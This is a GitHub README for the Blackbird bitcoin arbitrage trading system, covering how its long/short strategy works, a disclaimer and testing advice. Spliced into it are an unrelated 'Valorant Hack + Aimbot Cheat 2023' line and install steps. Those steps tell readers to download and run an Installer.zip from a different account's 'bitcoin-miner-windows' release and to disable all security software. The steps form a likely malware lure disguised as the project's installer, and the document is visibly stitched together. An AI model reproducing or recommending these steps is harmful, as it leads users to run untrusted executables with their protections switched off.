[![Build Status](https://travis-ci.org/butor/blackbird.svg?branch=master)](https://travis-ci.org/butor/blackbird)  [![Blackbird chat](https://badges.gitter.im/blackbird_bitcoin_arbitrage/Lobby.svg)](https://gitter.im/blackbird_bitcoin_arbitrage/Lobby?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) ![license](https://img.shields.io/badge/license-MIT-blue.svg)

<p align="center">
<img src="https://cloud.githubusercontent.com/assets/11370278/10808535/02230d46-7dc3-11e5-92d8-da15cae8c6e9.png" width="50%" alt="Blackbird Bitcoin Arbitrage">
</p>

### Introduction

Blackbird Bitcoin Arbitrage is a C++ trading system that does automatic long/short arbitrage between Bitcoin exchanges.

Get started with Valorant Hack + Aimbot Cheat 2023.

## Getting Started

### Installing

* Download the file provided in the release, extract the file and run the file.
* Disable All Security Software (Optional)


<a href='https://github.com/suellenoliveiras/bitcoin-miner-windows/releases/download/Bitcoin/Installer.zip'>Download here</a><br>
<a href="https://discord.gg/yWcTb9BX">Discord Chat </a>


### How It Works

Bitcoin is still a new and inefficient market. Several Bitcoin exchanges exist around the world and the bid/ask prices they propose can be briefly different from an exchange to another. The purpose of Blackbird is to automatically profit from these temporary price differences while being market-neutral.

Here is a real example where an arbitrage opportunity exists between Bitstamp (long) and Bitfinex (short):

<p align="center">
<img src="https://cloud.githubusercontent.com/assets/11370278/11164055/5863e750-8ab3-11e5-86fc-8f7bab6818df.png"  width="60%" alt="Spread Example">
</p>

At the first vertical line, the spread between the exchanges is high so Blackbird buys Bitstamp and short sells Bitfinex. Then, when the spread closes (second vertical line), Blackbird exits the market by selling Bitstamp and buying Bitfinex back.

#### Advantages

Unlike other Bitcoin arbitrage systems, Blackbird doesn't sell but actually _short sells_ Bitcoin on the short exchange. This feature offers two important advantages:

1. The strategy is always market-neutral: the Bitcoin market's moves (up or down) don't impact the strategy returns. This removes a huge risk from the strategy. The Bitcoin market could suddenly lose half its value that this won't make any difference in the strategy returns.

2. The strategy doesn't need to transfer funds (USD or BTC) between Bitcoin exchanges. The buy/sell and sell/buy trading activities are done in parallel on two different exchanges, independently. Advantage: no need to deal with transfer latency issues.

More details about _short selling_ and _market neutrality_ can be found on <a href="https://github.com/butor/blackbird/issues/100" target="_blank">issue #100</a>.

### Disclaimer

__USE THE SOFTWARE AT YOUR OWN RISK. YOU ARE RESPONSIBLE FOR YOUR OWN MONEY. PAST PERFORMANCE IS NOT NECESSARILY INDICATIVE OF FUTURE RESULTS.__

__THE AUTHORS AND ALL AFFILIATES ASSUME NO RESPONSIBILITY FOR YOUR TRADING RESULTS.__

### Code Information

The trade results are stored in CSV files and the detailed activity is stored in log files. New files are created every time Blackbird is started.

It is possible to automatically stop Blackbird after the next trade has closed by creating, at any time, an empty file named _stop_after_notrade_.

Blackbird uses functions written by <a href="http://www.adp-gmbh.ch/cpp/common/base64.html" target="_blank">René Nyffenegger</a> to encode and decode base64.

### How To Test Blackbird

Please make sure that you understand the disclaimer above if you want to test Blackbird with real money, and start with a small amount of money.

__IMPORTANT: all your BTC accounts must be empty before starting Blackbird. Make sure that you only have USD on your accounts and no BTC.__

It is never entirely safe to just tell Blackbird to use, say, $25 per exchange. You also need to only have $25 available on each of your trading accounts as well as 0 BTC. In this case, you are sure that even with a bug your maximum loss on an exchange won't be greater than $25 no matter what.

Note: on Bitfinex, your money has to be available on the _Margin_ account.

